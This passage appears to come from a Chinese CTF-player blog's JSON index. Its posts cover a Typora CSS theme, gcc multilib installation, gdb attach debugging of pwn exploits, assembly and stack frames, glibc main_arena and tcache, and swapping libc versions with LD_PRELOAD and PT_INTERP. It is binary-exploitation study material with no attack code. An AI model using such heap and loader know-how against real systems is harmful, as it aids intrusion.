然后我们找到代码高亮的css元素（其他的基本都是字体以及留白的一些样式，没有需求可以不用管）,找到对应的元素就可以开始魔改（ ​ (ps:感觉typora还有很多主题的方法可以使用，比如说backgroud = url（），通过这个 插入图片等，但是好像并没有找到类似的文档，我也不想再切图，于是作罢) ​ 其实魔改以后感觉变化也不是特别大，但是魔改的过程还是很有意思。 ​ 顺便附上它的css 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343344345346347348349350351352353354355356357358359360361362363364365366367368369370371372373374375376377378379380381382383384385386387388389390391392393394395396397398399400401402403404405406407408409410411412413414415416417418419420421422423424425426427428429430431432433434435436437438439440441442443444445446447448449450451452453454455456457458459460461462463464465466467468469470471472473474475476477478479480481482483484485486487488489490491492493 :root &#123; --side-bar-bg-color: #ffffff; --control-text-color: #424242; --active-file-bg-color: #ffffff; --active-file-border-color: #6B6B6B; --active-file-text-color: #7eadad; --table-even-row-color:#555555; --table-head-color:#7a7979; --deep-theme-color: #343a41; --code-block-bg-color: #292424; &#125;/*serif*/@font-face &#123; font-family: &#x27;Lexend&#x27;; font-weight: normal; font-style: normal; src: url(&#x27;./mint/Lexend-Regular.ttf&#x27;) &#125;@font-face &#123; font-family: &#x27;Lexend&#x27;; font-weight: bold; font-style: normal; src: url(&#x27;./mint/Lexend-Bold.ttf&#x27;) &#125;/*monospace*/@font-face &#123; font-family: &#x27;SourceCodePro&#x27;; font-weight: normal; font-style: normal; src: local(SourceCodePro), url(&#x27;./mint/SourceCodePro-Regular.ttf&#x27;)&#125;/*Chinese*/@font-face &#123; font-family: &#x27;NotoSansSC&#x27;; font-weight: normal; font-style: normal; src: url(&#x27;./mint/NotoSansSC-Regular.otf&#x27;)&#125;@font-face &#123; font-family: &#x27;NotoSansSC&#x27;; font-weight: bold; font-style: normal; src: url(&#x27;./mint/NotoSansSC-Bold.otf&#x27;)&#125;html&#123; font-size: 16px;&#125;body &#123; font-family: &#x27;Lexend&#x27;,&#x27;SourceCodePro&#x27;,&#x27;NotoSansSC&#x27;; font-weight: normal; line-height: 1.5rem; letter-spacing: 0; margin: 0;&#125;#write &#123; max-width: 900px; padding: 30px 50px 20px;&#125;#write p&#123; text-align:left;&#125;#write pre.md-meta-block &#123; padding: 1rem; font-size: 85%; line-height: 1.45; background-color: #ffffff; border: 0; border-radius: 3px; color: #141414; margin-top: 0 !important;&#125;.md-image&gt;.md-meta &#123; color: #141414; font-size: 0.9rem; font-family: &#x27;Lexend&#x27;; padding: 4px 0;&#125;@media print &#123; html,body &#123; font-size: 14px; &#125; table, pre &#123; page-break-inside: avoid; &#125; pre &#123; word-wrap: break-word; &#125; &#125;@page &#123; size: A4; margin: 8mm 0mm;&#125;/*toc*/.md-toc &#123; margin-top:20px; padding-bottom:20px; color: var(--deep-theme-color);&#125;a &#123; color: var(--deep-theme-color); text-decoration: none;&#125;a:hover &#123; text-decoration: underline;&#125;/*headers*/h1,h2,h3,h4,h5,h6 &#123; display: block; font-weight:bold;&#125;h1 &#123; font-size: 2em; margin-top: 0.67em; margin-bottom: 0.67em;&#125;h2 &#123; font-size: 1.5em; margin-top: 0.83em; margin-bottom: 0.83em;&#125;h3 &#123; font-size: 1.17em; margin-top: 1em; margin-bottom: 1em;&#125;h4 &#123; font-size: 1em; margin-top: 1.33em; margin-bottom: 1.33em;&#125;h5 &#123; font-size: 1em; margin-top: 1.33em; margin-bottom: 1.33em; color: #777777;&#125;h6 &#123; font-size: 1em; margin-top: 1.33em; margin-bottom: 1.33em; color: #adadad;&#125;p,blockquote,ul,ol,dl,table &#123; margin: 0.8rem 0;&#125;/*table*/table &#123; border-collapse: collapse; padding: 0; word-break: initial; table-layout: fixed; width: 100%;&#125;table tr:nth-child(even)&#123; background-color: var(--table-even-row-color);&#125;thead&#123; background-color: var(--table-head-color);&#125;table th&#123; text-align: center; padding:6px 13px; border: 1px solid var(--table-head-color);&#125;table td&#123; padding:6px 13px; border: 1px solid var(--table-head-color);&#125;table tr&#123; padding:6px 13px; border: 1px solid var(--table-head-color);&#125;/*blockquote*/blockquote &#123; border-left: 0.2rem solid var(--side-bar-bg-color); color: #b4d8e9; font-family: &#x27;Lexend&#x27;,&#x27;NotoSansSC&#x27;; font-size: 0.9rem; padding-left: 2rem;&#125;/*list*/li p.first &#123; display: inline-block;&#125;ul,ol &#123; padding-left: 30px;&#125;ul:first-child,ol:first-child &#123; margin-top: 0;&#125;ul:last-child,ol:last-child &#123; margin-bottom: 0;&#125;.md-task-list-item:hover &gt; input:before,input[type=&#x27;checkbox&#x27;]:hover:before &#123; opacity: 1; transition: 0.5s; background-color: var(--side-bar-bg-color);&#125;.task-list-item input::before &#123; content: &quot;&quot;; display: inline-block; border-radius: 1.1rem; vertical-align: middle; border: 1.2px solid var(--deep-theme-color); background-color: #ffffff; width: 1.1rem; height: 1.1rem; margin-left: -0.1rem; margin-right: 0.1rem; margin-top: -0.68rem; &#125;.task-list-item input:checked::before &#123; padding-left: 0.125em; content: &#x27;✔&#x27;; color:white; background-color: var(--deep-theme-color); font-size: 0.8rem; line-height: 0.95rem; margin-top: -0.68rem; transition: background-color 200ms ease-in-out;&#125;.task-list-done &#123; text-decoration: line-through; color: #343a41;&#125;hr &#123; border-style: none; border-top-style: solid; border-color: #e7e7e7; border-width: 1px; margin: 2rem 0;&#125;/*highlight*/#write mark &#123; background-color: #c7ffe8; border-radius: 2px; color: rgb(44, 39, 39); padding: 0 4px; margin: 0 2px;&#125;/*inline code*/#write code,tt &#123; padding: 0.6px 4px; border-radius: 2px; background-color: rgba(238, 238, 238, 0.39); font-family: &#x27;SourceCodePro&#x27;,Consolas,Courier, Monospace; font-size: 0.9rem; color: #666666; margin: 0 2px;&#125;/*footnote*/#write .md-footnote &#123; color: #343a41; background-color: #e4e4e4;&#125;/*source code mode*/.cm-s-typora-default .cm-header &#123; color: #524a4a;&#125;.cm-s-typora-default .cm-link &#123; color:var(--deep-theme-color);&#125;/*code block*/#write .md-fences &#123; font-size: 1rem; margin: 0.2em 0; padding: 0.5em; border-radius: 3px; font-size: 0.9em; font-family: &#x27;SourceCodePro&#x27;,Consolas,Courier, Monospace ; background-color: #fffdfd; color: #a3a3a3; border: none; text-shadow: none;&#125;.md-fences .code-tooltip &#123; background-color: #ffffff;&#125;/* Name: material-ocean Author: Mattia Astorino (http://github.com/equinusocio) Website: https://material-theme.site/*/.cm-s-inner.CodeMirror &#123; background-color: #ffffff; color: #343a41;&#125;/*.cm-s-inner .CodeMirror-gutters &#123; background: #ffffff; color: #ffffff; border: none;&#125;*/.cm-s-inner .CodeMirror-linenumber &#123;color: #343a41;&#125;.cm-s-inner .CodeMirror-guttermarker &#123; color: #FFEE80; &#125;.cm-s-inner .CodeMirror-guttermarker-subtle &#123; color: #D0D0D0; &#125;/*.cm-s-inner .CodeMirror-cursor &#123; border-left: 1px solid #FFCC00;&#125;.cm-s-inner.cm-fat-cursor .CodeMirror-cursor &#123; background-color: #FFCC00 !important;&#125;.cm-s-inner .cm-animate-fat-cursor &#123; background-color: #FFCC00 !important;&#125;*/.cm-s-inner .CodeMirror-cursor &#123; border-left: 1px solid #A9B7C6; &#125;.cm-s-inner div.CodeMirror-cursor &#123; border-left: 1px solid #ffffff; &#125;.cm-s-inner div.CodeMirror-selected &#123; background: rgba(58, 58, 59, 0.2);&#125;.cm-s-inner.CodeMirror-focused div.CodeMirror-selected &#123; background: rgba(221, 224, 241, 0.2);&#125;.cm-s-inner .CodeMirror-selected&#123; background: #d6dce7 !important; &#125;.cm-s-inner .CodeMirror-selectedtext &#123; background: #dbdee6 !important; &#125;.cm-overlay.CodeMirror-selectedtext &#123; background: #B5D6FC !important; &#125;.cm-s-inner .CodeMirror-line::selection,.cm-s-inner .CodeMirror-line&gt;span::selection,.cm-s-inner .CodeMirror-line&gt;span&gt;span::selection &#123; background: rgba(221, 224, 241, 0.2);&#125;.cm-s-inner .CodeMirror-line::-moz-selection,.cm-s-inner .CodeMirror-line&gt;span::-moz-selection,.cm-s-inner .CodeMirror-line&gt;span&gt;span::-moz-selection &#123; background: rgba(221, 224, 241, 0.2);&#125;.cm-s-inner .CodeMirror-activeline-background &#123; background: #ffffff;&#125;.cm-s-inner .cm-keyword &#123; color: #8979c0;&#125;.cm-s-inner .cm-operator &#123; color: #25c494;&#125;.cm-s-inner .cm-variable-2 &#123; color: #4f5481;&#125;.cm-s-inner .cm-variable-3,.cm-s-inner .cm-type &#123; color: #f84f57;&#125;.cm-s-inner .cm-builtin &#123; color: #eca622;&#125;.cm-s-inner .cm-atom &#123; color: #F78C6C;&#125;.cm-s-inner .cm-number &#123; color: #ad7a83;&#125;.cm-s-inner .cm-def &#123; color: #82AAFF;&#125;.cm-s-inner .cm-string &#123; color: #70be26;&#125;.cm-s-inner .cm-string-2 &#123; color: #7a232e;&#125;.cm-s-inner .cm-comment &#123; color: #3a4677;&#125;.cm-s-inner .cm-variable &#123; color: #bb584b;&#125;.cm-s-inner .cm-tag &#123; color: #b44457;&#125;.cm-s-inner .cm-meta &#123; color: #b9b717;&#125;.cm-s-inner .cm-attribute &#123; color: #71498a;&#125;.cm-s-inner .cm-property &#123; color: #a075be;&#125;.cm-s-inner .cm-qualifier &#123; color: #f8ce11;&#125;.cm-s-inner .cm-variable-3,.cm-s-inner .cm-type &#123; color: #fce470;&#125;.cm-s-inner .cm-error &#123; color: rgba(255, 255, 255, 1.0); background-color: #FF5370;&#125;.cm-s-inner .CodeMirror-matchingbracket &#123; text-decoration: underline; color: white !important;&#125;","categories":[{"name":"MESS","slug":"MESS","permalink":"https://fuurinko.github.io/categories/MESS/"}],"tags":[{"name":"mess","slug":"mess","permalink":"https://fuurinko.github.io/tags/mess/"}]},{"title":"解决gcc无法编译32位程序的问题","slug":"mess_解决gcc无法编译32位程序的问题","date":"2021-10-27T12:26:56.705Z","updated":"2022-04-09T08:37:55.054Z","comments":true,"path":"2021/10/27/mess_解决gcc无法编译32位程序的问题/","link":"","permalink":"https://fuurinko.github.io/2021/10/27/mess_%E8%A7%A3%E5%86%B3gcc%E6%97%A0%E6%B3%95%E7%BC%96%E8%AF%9132%E4%BD%8D%E7%A8%8B%E5%BA%8F%E7%9A%84%E9%97%AE%E9%A2%98/","excerpt":"","text":"1）前言​ 之前一直被gcc无法编译32位程序而困扰，但是问题一直拖着没有解决，趁着今天比较闲，把这个问题彻底解决一下。 2)过程​ 首先我们尝试编译32位程序，gcc报错： ​ 缺少头文件，实则是没有安装多架构gcc。 ​ 试图安装，失败，报错如下： ​ 这里有个坑了我好久的东西，就是这个报错 E: Unable to correct problems, you have held broken packages. ​ 无法修正问题，你持有held broken的软件包。 ​ 我一直没有理解正确这个held的意思，我以为是持有的意思，所以一直以来这句话在我眼中的意思是，你已经有这个软件包了，但是你不能安装。 ​ 但实际上，但凡熟悉过apt或者dkpg的一些命令，或者但凡对linux文件系统稍微熟悉一点都知道其实hold是为了防止更新不想更新的软件包，而特殊设置的功能。通过apt- mark或者dpkg命令 ，从apt-get中将特定的软件包的更新排除。而这道题的报错就是源于这点–gcc-7-multilib等依赖的软件包版本不对，但是由于held，所以并没有被更新。 ​ 但是通过dpkg --get-selections | grep hold指令查找held的软件包，并没有任何结果。 ​ 经过各种试错，找到了一个快速解决的方法。 1sudo aptitude install gcc-multilib aptitude与apt类似，也是包管理器。但是通过aptitude进行包管理，对于软件包依赖问题的处理更加细节。 ​ 下面是一些常用的命令 12345aptitude update #更新可用的包列表aptitude purge &lt;pkgname&gt; #删除包及其配置文件aptitude search &lt;pkgname&gt; #搜索包aptitude clean #删除下载的包文件aptitude autoclean #删除过期的包文件 aptitude执行起来和apt其实不太一样，比如 sudo aptitude install gcc-multilib 这个命令其实执行起来长这样： ​ 然后aptitude会问你 ​ 这里是最大的坑。如果是像我这种不想看英文按照习惯输Y的人，这里会踩一个大坑。 ​ 明确地告诉了我： 123456789The following actions will resolve these dependencies: Keep the following packages at their current version: ... ... ... Accept this solution? [Y/n/q/?] 保持下面软件包的版本不变，你接受这个解决方式吗？ 显然我不接受，只要摁下N，问题就解决了。 然后。自动执行gdb-multilib的安装。 问题解决。 3）总结​ 这个问题回过头来想，其实非常简单，如果清楚问题所在的话，只需要一行命令就能解决。当然并不是每个人都经验丰富，但是没有经验，可以积累经验，然而在积累的过程中，有些愚蠢的错误确实是不应该犯的。比如说，不认真看报错信息，或者提示，凭着感觉装。这是我在处理这种问题上最大的弱点。 ​ 一个原因是我骄傲自满了，我确实认为在这一步不会出错，但是实际上问题就是发生在这一步上，另外就是，全英文的屏显，没有人愿意仔细阅读，但是这点没有办法，绝对不可能调成中文，这里只能是说，慢慢看，仔细看 ，然后提升一下英语水平。（但是有一说一，英语母语的人可能都不愿意看吧） 4）参考【Ubuntu】aptitude命令详解 Unable to correct problems, you have held broken packages","categories":[{"name":"MESS","slug":"MESS","permalink":"https://fuurinko.github.io/categories/MESS/"}],"tags":[{"name":"linux primary","slug":"linux-primary","permalink":"https://fuurinko.github.io/tags/linux-primary/"}]},{"title":"gdb附加调试的一些黑魔法","slug":"sum_gdb附加调试的一些黑魔法","date":"2021-10-27T03:21:25.650Z","updated":"2022-10-24T12:41:49.184Z","comments":true,"path":"2021/10/27/sum_gdb附加调试的一些黑魔法/","link":"","permalink":"https://fuurinko.github.io/2021/10/27/sum_gdb%E9%99%84%E5%8A%A0%E8%B0%83%E8%AF%95%E7%9A%84%E4%B8%80%E4%BA%9B%E9%BB%91%E9%AD%94%E6%B3%95/","excerpt":"","text":"1）abstract​ 这个part主要综合了一些奇怪的调试中遇到的问题，不定期更新。 2）格式化字符串-cctf-pwn31）pause（p）导致ERROR: Could not find ELF base问题​ 在开始动调这个exp的时候，发现一个很奇怪的点就是如果下的断点的模式gdb.attach(sh)，那么程序会异常退出，大概是这样： 1234567891011121314151617181920212223242526Attaching to program: /home/rin/pwn/ctf-wiki/format/cctf-pwn3/pwn3, process 27837Reading symbols from /lib/i386-linux-gnu/libc.so.6...Reading symbols from /usr/lib/debug//lib/i386-linux-gnu/libc-2.27.so...done.ERROR: Could not find ELF base!done.Reading symbols from /lib/ld-linux.so.2...Reading symbols from /usr/lib/debug//lib/i386-linux-gnu/ld-2.27.so...done.done.Cannot access memory at address 0xf7fad924warning: Unable to find dynamic linker breakpoint function.GDB will be unable to debug shared library initializersand track explicitly loaded dynamic code.Failed to read a valid object file image from memory.ERROR: Could not find ELF base!ERROR: Could not find ELF base!ERROR: Could not find ELF base!ERROR: Could not find ELF base!ERROR: Could not find ELF base!ERROR: Could not find ELF base!ERROR: Could not find ELF base!0xf7f85b59 in ?? ()ERROR: Could not find ELF base!ERROR: Could not find ELF base!ERROR: Could not find ELF base!ERROR: Could not find ELF base! ​ 首先需要知道这个报错的原因。 ​ 虽然我并没有查到ERROR: Could not find ELF base!这个报错发生的直接trigger，但是很显然这个报错发生是因为程序进程中止，因此无法找到elf base。 ​ 那么进程中止的原因何在？ 解决方案​ 经过大师指点，这个问题其实是因为exp错误（ ​ 这里的问题是在断点之后，我引用了未经定义的payload，导致程序异常退出，然后这个退出反映在gdb中则是elf base not found。 总结​ 如果exp正确，这个报错其实并不会存在。可以反推，如果再次碰到类似的报错，十有八九是exp的问题，而并不能把一切锅推给环境。 3）__kernel_vsyscall？问题​ 上一个问题中提到，如果我们只是输入gdb.attach()，那么程序会断在__kernel_vsyscall这个函数上。遇见这个函数也是不止一次了，但是从未想过要了解它，今天我决定一探究竟。 ​ 我们期望我们的进程暂停在puts payload之前，实际上确实，在此之前，exp没几乎没有任何与远端的io交互，所以断在奇怪的地方也可以理解，那么__kernel_vsyscall是一个怎样的函数，为什么偏偏就断在它的身上呢？ 解决​ 在stackoverflow上，我们能够看出一些端倪。 ​ __kernel_vsyscal is the method used by linux-gate.so (a part of the Linux kernel) to make a system call using the fastest available method, preferably the sysenter instruction. ​ 这其实就是个系统调用方法，回想一下在srop中的知识点，其实每个系统调用都是一个中断，然后系统切换至内核态进行工作，完成后再切换回用户态，并将结果返回至用户态。 ​ 所以出现 __kernel_vsyscal 意味着此刻程序正在进行系统调用。我们同时可以注意到，当 __kernel_vsyscal 函数执行完成，下一个函数则是read函数，也符合我们程序的逻辑–一个菜单题，exp中任何一条语句的结束都将使得函数执行流回到main函数，等待我们的指令。 当然要结束这个函数我们只需要gdb finish。 或者直接使用gdb.attach(sh,”break xxx”)。 关于系统调用我想又可以写一篇专门的博客来研究，这里就不费笔墨了，详情可见： 4）gdb附加调试下断点的几种姿势。1）gdb.attach(p)2）gdb.attach(p,”break &lt;func name&gt;”)3）p = gdb.debug(“elf”,”break &lt;func name&gt;” )5）p = gdb.debug(“elf”,”break &lt;func name&gt;” ) ​ 6）Linux Signal​ 在调试萌新赛题目的时候总是按ctrl+c试图终给程序一个断点，然后就报错。如图 ​ 感觉也不是段错误，反正类似。感觉有必要系统地了解一下linux的信号机制。 ​ 在CSAPP Chapter8 Section5中，我们能看到对于linux signal的详细解释。 ​ signal算是对程序的一种软中断。一般我们能接收到的有关信号处理都是发生在程序异常的时候。然后这里sigint就是当我们按下ctrl+c，内核就给进程发送一个sigint信号，使进程中断。 ​ csapp上一个表非常清晰地描述了一些信号的作用以及对应的默认行为。 ​ ​ 实际的信号不止这三十种。但是一般来说就是这些。 ）参考如何做到一边使用pwntools一边使用gdb下断点到main函数前","categories":[{"name":"MESS","slug":"MESS","permalink":"https://fuurinko.github.io/categories/MESS/"}],"tags":[{"name":"gdb","slug":"gdb","permalink":"https://fuurinko.github.io/tags/gdb/"}]},{"title":"汇编小知识点","slug":"sum_汇编基础","date":"2021-10-13T09:25:43.372Z","updated":"2022-10-24T01:33:30.002Z","comments":true,"path":"2021/10/13/sum_汇编基础/","link":"","permalink":"https://fuurinko.github.io/2021/10/13/sum_%E6%B1%87%E7%BC%96%E5%9F%BA%E7%A1%80/","excerpt":"","text":"[TOC] 汇编语言1）寻址1/直接寻址1mov rax, fs:28h #直接寻址，fs段寄存器+偏移量。这里其实是一个canary的值。 2/间接寻址间接在使用指针以及解引用的形式 1mov [rbp+var_8], rax # 寄存器相对寻址。相当于把rax，也就是这个canary值放到rbp+var_8的地方。 3/比例寻址例如在数组遍历中 123456.dataarrayD 1,2,3,4.codemov esi,3mov eax,arrayD[esi*4] ;eax = 4 其中，比例因子“4”代表数组的元素个数，esi的值代表下标。 2）段寄存器其实就是段的基址，起寻址索引作用。例子就比如上一个mov rax fs：28h 3）基础指令1/数据传输mov为了实现各种数据的传输，mov还有一下几种派生指令 movzx对目的操作数进行全0拓展并且复制。 movsx同上，但是是用1拓展而不是0。 与数据传输相关的指令还有很多，以后待补充。 2/与数据相关的运算符和伪指令offset返回一个偏移量 align将一个变量对齐到边界。 ps：对于cpu来说，处理偶地址速度会快于奇地址。 ptr重写一个已经被声明过操作数的大小类型。 type返回变量单个元素的大小 lengthof计算数组中元素的个数 sizeof返回lengthof和type的乘积 函数调用栈从一个简单的程序入手。 程序来自你邮萌新赛pwn1-人类补习计划。 ​ 可以看到对栈空间进行一个初始化的操作的三行关键代码。 123push rbpmov rbp, rspsub rsp, 30h 然后就是人神共愤的函数调用栈环节。 rbp ： 栈基址指针寄存器 。 rsp ： 栈顶指针寄存器。 ​ 之前也提到，栈是一种先进后出的数据结构，所以肯定有一端是固定的，然后另一端用来操作。这里rbp就对应固定的栈底（高地址），rsp对应一直在变化的栈顶（低地址）。 ​ 并且因为rbp通常是固定的，所以函数的一些局部变量的索引的基址就是rbp。 ​ 值得一提的是，以静态调试的角度来看一个程序的二进制文件，内存地址都是由低地址向高地址增长的，所以在ida中，stack的结构大致如下。 ​ ebp也就是s的位置，很显然在esp之下。 ​ 然而实际上，在内存空间中，栈上的数据是由高地址向低地址增长。也就是地址越小，实际离ebp越远。 主调函数将参数按照调用约定依次入栈(图中为从右到左)，然后将指令指针EIP入栈以保存主调函数的返回地址(下一条待执行指令的地址)。进入被调函数时，被调函数将主调函数的帧基指针EBP入栈，并将主调函数的栈顶指针ESP值赋给被调函数的EBP(作为被调函数的栈底)，接着改变ESP值来为函数局部变量预留空间。此时被调函数帧基指针指向被调函数的栈底。以该地址为基准，向上(栈底方向)可获取主调函数的返回地址、参数值，向下(栈顶方向)能获取被调函数的局部变量值，而该地址处又存放着上一层主调函数的帧基指针值。本级调用结束后，将EBP指针值赋给ESP，使ESP再次指向被调函数栈底以释放局部变量；再将已压栈的主调函数帧基指针弹出到EBP，并弹出返回地址到EIP。ESP继续上移越过参数，最终回到函数调用前的状态，即恢复原来主调函数的栈帧。如此递归便形成函数调用栈。 这段话说得非常玄学，而csapp中说得就非常简单清晰 当前正在执行的过程的帧总是在栈 顶。当过程P调用过程Q时，会把返回地址压入栈中，指明当Q返回时，要从P程序的哪 个位置继续执行。我们把这个返回地址当做P的栈帧的一部分，因为它存放的是与P相关 的状态。Q的代码会扩展当前栈的边界，分配它的栈帧所需的空间。在这个空间中，它可 以保存寄存器的值，分配局部变量空间，为它调用的过程设置参数。 ​ 还有一点就是，之前也没有很正确地理解何为局部变量。虽然众所周知的知识点是说，局部变量是函数内部定义的变量，离开这个函数就无法被引用，然而我总是没有将局部变量与buf 联系起来，实际上buf，这个缓冲区，就是被调函数的局部变量。 ​ 那么直接从动态调试的角度来研究函数调用栈。 ​ 关于压栈的一些传参方式，可以参见格式化字符串偏移计算原理及pwntools fmtstr功能源码剖析，这里主要讨论传参以后，有关返回地址以及栈顶栈指针变化的一些操作，以及一些奇怪的初始化相关函数的运行姿势。 当执行完push rbp以及 sub rsp ，0x30以后，栈空间为0x30。 此时可以注意到整个栈上存的指针都非常奇怪，也就是libc中的一些初始化函数的指令。 可以联系一下ret2csu中的知识点，也就是main函数执行前_libc_start_main执行点一系列初始化操作。 tbc","categories":[{"name":"Generalization","slug":"Generalization","permalink":"https://fuurinko.github.io/categories/Generalization/"}],"tags":[{"name":"assemble","slug":"assemble","permalink":"https://fuurinko.github.io/tags/assemble/"}]},{"title":"main_arana 与多线程","slug":"mess_main_arana 与多线程","date":"2021-08-18T09:24:05.282Z","updated":"2022-10-24T12:46:32.000Z","comments":true,"path":"2021/08/18/mess_main_arana 与多线程/","link":"","permalink":"https://fuurinko.github.io/2021/08/18/mess_main_arana%20%E4%B8%8E%E5%A4%9A%E7%BA%BF%E7%A8%8B/","excerpt":"","text":"在学习Tcache的时候遇到了一些比较奇怪的点，ctf权威指南pwn篇中对于Tcache的解释中第一段如下： Tcache全名为Thread Local Caching，它为每个线程创建一个缓存，里面包含了一些小堆块，无需对main_arena上锁即可使用。 首先让我感到不解的就是，“无需对main_arena上锁即可使用”这句话。什么叫对main_arana上锁？之前也遇见过很多文章提到过这个”锁“的相关概念，但是它们从来都不是问题的重点，但是通常来说，正是一个个不懂的”无关紧要“的问题导致最后啥也看不懂的。 所以在这篇文章中我们有必要从ctf pwn的角度去理解线程 main_arena。 加锁当多个线程同时操作同一个共享全局变量的时候，对线程上锁，保证同一时间一个对象只有一个线程在访问，可以解决资源占用问题，同时保证了数据的安全性。 线程线程一般来说被进程包含：一个进程可以有很多线程来处理，每条线程并行执行不同的任务。 比如说ptmalloc2这个是个进程，然后其中包含很多很多线程。 其中会有一个main_arena,是整个ptmalloc2进程中的主线程，然后main_arena会有很多子线程，每个子线程包含很多连续的内存片段，被称为heap。每一个heap都有自己的heap_header，它们通过链表互相连接，且其中保存了指向其所属arena的指针。 这么讲似乎有一些太过抽象。具体一点讲就是，在只有一个main_arena的时候，ptmalloc只能通过mmap和sbrk申请堆内存。 在多线程的情况下，显然让所有的线程公用一个数据结构来获取内存块会造成十分惨烈的对锁的竞争，所以 ptmalloc 中间多了一层组织结构——arena。每个arena包含一些可用的内存区块，用一个 arena 级别的锁来控制访问。当线程比较少的时候，每个可以拥有自己的arena，而当 arena 数目超过允许最大值时，多个线程共享一个 arena 了。个线程第一次 malloc 的时候都会 attach 一个 arena 。除非这个 arena 被标记为破坏的（ARENA_CORRUPTION_BIT），否则该线程以后再 malloc 都会继续用这个 arena。 之前ctf权威指南中有讲到，每一个子线程包含很多连续的内存片段，被称为heap。它们都有自己所属的arena。这句话很容易让人觉得——每一个子线程有且只有一个arena，但是还存在多对一的情况。 但是对于ctf pwn来说，实际情况远远没有这么复杂，基本我们操作的所谓的堆，chunk这些概念，考点基本都是建立在单线程的情况下的，它们的arena也都是main_arena而并不是什么non_main_arena。并且只有main_arena能够访问heap段，non_main_arena只能访问mmap映射区域。 总结用比较简单的话来说，main_arena就是主线程中一个管理所有链表的关键的数据结构，我们可以通过它获得各个bins的偏移。以及利用指向它的fd来做一些不好的事情（）。承接之前的内容，我们在利用main_arena的同时也需要对其进行上锁，防止别的线程与它共用一个资源，然后之前Tcahce里的“无需对main_arena上锁”意思也很清楚了，因为考虑到效率。所以抛弃了一定的安全性。 参考malloc x 线程 GLibcHeap","categories":[{"name":"MESS","slug":"MESS","permalink":"https://fuurinko.github.io/categories/MESS/"}],"tags":[{"name":"mess","slug":"mess","permalink":"https://fuurinko.github.io/tags/mess/"}]},{"title":"ubuntu加载不同版本libc","slug":"mess_ubuntu加载不同版本libc","date":"2021-08-17T02:53:00.000Z","updated":"2022-03-20T04:33:11.439Z","comments":true,"path":"2021/08/17/mess_ubuntu加载不同版本libc/","link":"","permalink":"https://fuurinko.github.io/2021/08/17/mess_ubuntu%E5%8A%A0%E8%BD%BD%E4%B8%8D%E5%90%8C%E7%89%88%E6%9C%AClibc/","excerpt":"","text":"1）review 这个问题困扰了我多年，之前年轻的时候不知道为什么有的是题我就是死活调不出，后来才知道呀原来用的ubunt的版本太高了。但是我一直忽视了这个问题以为并不是什么关键的因素。我是这么认为的–只要清楚了利用方法并记住对应的libc版本，无论是不是真的把这道题调试出来了都无所谓。 然后我就是这样一步一步地变得不会调试的。 但是完整地把一道题调出来。这才是关键。这才是pwn题的灵魂。 呜呜呜，我居然一直忽略了它的灵魂 所以这一次我一定要解决掉这个问题。 之前做考核的时候，稍微研究过这个问题。但是因为下载的的libc并没有debug符号，最终还是放弃了。 目前来说针对题目的调试，一般来说是本地，远程也不用考虑这个问题。 2）原理在这之前我们需要了解一下ld以及libc在动态链接中的具体作用。实际上这也是一个比较基础的概念，ld链接器，libc共享库没什么好说的。 但是这里有一堆环境变量就很离谱。我们来依次列举一下并且搞清楚它们是做什么的。 1）LD_PRELOAD首先就是我们在脚本前加载的LD_PRELOAD这个东西。一般的用法是env=&#123;&quot;LD_PRELOAD&quot;:libc_path&#125; 它可以影响程序的运行时的链接（Runtime linker），允许你定义在程序运行前优先加载的动态链接库。 这个功能主要就是用来有选择性的载入不同动态链接库中的相同函数。通过这个环境变量，我们可以在主程序和其动态链接库的中间加载别的动态链接库，甚至覆盖正常的函数库。 换句话说我们可以通过指定这个环境变量来指定特定的libc版本。 2）LD_LIBRARY_PATH和LIBRARY_PATHLD_LIBRARY_PATH用于在程序加载运行期间查找动态链接库时指定除了系统默认路径之外的其他路径. LIBRARY_PATH环境变量用于在程序编译期间查找动态链接库时指定查找共享库的路径 其实可以发现这三个环境变量都是修改程序需要的共享库，但是生效的时间不一样。 并且在pwn题中基本都是需要在运行前指定另外的共享库的，所以LD_PRELOAD还是比较常见。 相关（？）环境变量大概就这么多，然后是某些特殊的段。 1） PT_INTERP储存了程序使用的ld.so的路径，默认使用 /lib64/ld-linux-x86-64.so.2。 我们可以修改这个段的内容来指定我们需要的链接器。 汇总综上，我们首先要准备我们需要的libc和ld，libc可以是编译好的elf文件也可以通过源码自己编译，这个无所谓。ld文件比较诡异，似乎是一个ld能同时支持很多libc的小版本。并不是一对一的关系。 准备好了以后我们通过脚本将题目PT_INTERP段修改，然后通过LD_PRELOAD指定我们需要的libc的路径即可。 实际操作我们以lonelywolf为例。 有一个很尴尬的事实就是，我找不到比赛提供的libc了。当时存了，但是没有了。 参考LD_PRELOAD的偷梁换柱之能","categories":[{"name":"MESS","slug":"MESS","permalink":"https://fuurinko.github.io/categories/MESS/"}],"tags":[{"name":"linux primary","slug":"linux-primary","permalink":"https://fuurinko.github.io/tags/linux-primary/"}]},{"title":"记一次ubuntu18.04的glibc调教","slug":"mess_记一次ubuntu18.04的glibc调教","date":"2021-08-16T13:24:18.623Z","updated":"2022-04-09T08:38:06.111Z","comments":true,"path":"2021/08/16/mess_记一次ubuntu18.04的glibc调教/","link":"","permalink":"https://fuurinko.github.io/2021/08/16/mess_%E8%AE%B0%E4%B8%80%E6%AC%A1ubuntu18.04%E7%9A%84glibc%E8%B0%83%E6%95%99/","excerpt":"","text":"1）概述这是一件悲伤的事情，我的ubuntu它又崩了。 最开始的时候，发现pwndbg无法查看heap等信息，这个问题我之前也遇到过，但是情况有非常大的区别。 之前是我2.32的本地默认libc，执行程序时加载2.23，然后因为指定的lbc-2.23.so没有附带调试符号信息，所以也看不了heap，但是这一次，本机都看不了了？ 经过一番排查，我们认为是libc本身出现了问题。然后寻找libc-2.27.so的文件打算一探究竟，但找到本应该储存着它的文件夹时，惊奇地发现它居然从文件夹中消失了。 